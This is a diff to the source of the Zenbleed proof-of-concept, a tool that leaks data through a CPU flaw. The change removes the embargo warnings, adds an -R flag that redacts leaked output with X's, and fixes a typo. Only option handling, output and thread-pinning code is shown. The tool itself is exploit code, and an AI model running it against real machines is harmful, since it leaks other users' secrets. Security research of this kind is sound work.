@@ -19,8 +19,6 @@
 //
 // This is a Work-in-Progress testcase for the Zenbleed vulnerability.
 //
-// ** DO NOT DISTRIBUTE - EMBARGOED SECURITY ISSUE **
-//
 // Tavis Ormandy <taviso@google.com>
 //
 
@@ -36,6 +34,7 @@ static uint64_t maxleak;
 
 static bool asciionly = true;
 static bool secretonly = false;
+static bool redact = false;
 
 // Minor variations in alignment seem to make the exploit work better on
 // different SKUs. These are some variants to try and see what works best.
@@ -101,10 +100,11 @@ static void * thread_leak_consumer(void *param)
 
             // Escape any confusing characters
             if (*s == '"' || *s == '\\')
-                fputc('\\', stdout);
+               if (!redact) fputc('\\', stdout);
             // Print normal ascii.
             if (isalnum(*s) || ispunct(*s)) {
-                fputc(*s, stdout);
+                if (!redact) fputc(*s, stdout); 
+                  else fputc('X',stdout);
             } else if (isspace(*s)) {
                 fputc(' ', stdout);
             } else {
@@ -207,14 +207,13 @@ static pthread_t spawn_thread_core(void *(*start_routine)(void *), void *restric
     if (pthread_attr_setaffinity_np(&attr, sizeof(cpu_set_t), &set) != 0)
         err(EXIT_FAILURE, "failed to lock thread to specified core %d", cpu);
     if (pthread_create(&tid, &attr, start_routine, arg) != 0)
-        err(EXIT_FAILURE, "failed to start thread on specifed code %d", cpu);
+        err(EXIT_FAILURE, "failed to start thread on specified code %d", cpu);
     pthread_attr_destroy(&attr);
     return tid;
 }
 
 static void print_banner()
 {
-    logmsg("*** EMBARGOED SECURITY ISSUE --  DO NOT DISTRIBUTE! ***");
     logmsg("ZenBleed Testcase -- taviso@google.com");
     logmsg("");
     logmsg("NOTE: Try -h to see configuration options");
@@ -232,6 +231,7 @@ static void print_help()
     logmsg("   -t N    Give up after this many seconds.");
     logmsg("   -n N    Set nice level, can improve results on some systems.");
     logmsg("   -a      Print all data, not just ASCII strings.");
+    logmsg("   -R      Redact output data with X's.");
     logmsg("   -s      Only print the magic hammer value (used for benchmarking).");
     logmsg("   -p STR  Pattern mode, try to continue string STR based on sampling leaked values.");
     logmsg("   -q      Quiet, reduce verbosity.");
@@ -258,7 +258,7 @@ int main(int argc, char **argv) {
     pattern   = 0;        // String to search for.
     cores     = 0;        // Which cpus to run on.
 
-    while ((opt = getopt(argc, argv, "r:qp:sat:n:hH:c:v:m:")) != -1) {
+    while ((opt = getopt(argc, argv, "r:qRp:sat:n:hH:c:v:m:")) != -1) {
         switch (opt) {
             case 'v': variant = atoi(optarg);
                       break;
@@ -279,6 +279,8 @@ int main(int argc, char **argv) {
             case 'p': pattern = optarg;
                       break;
             case 'q': quiet = true;
+                      break;
+            case 'R': redact = true;
                       break;
             case 'r': cores = optarg;
                       break;
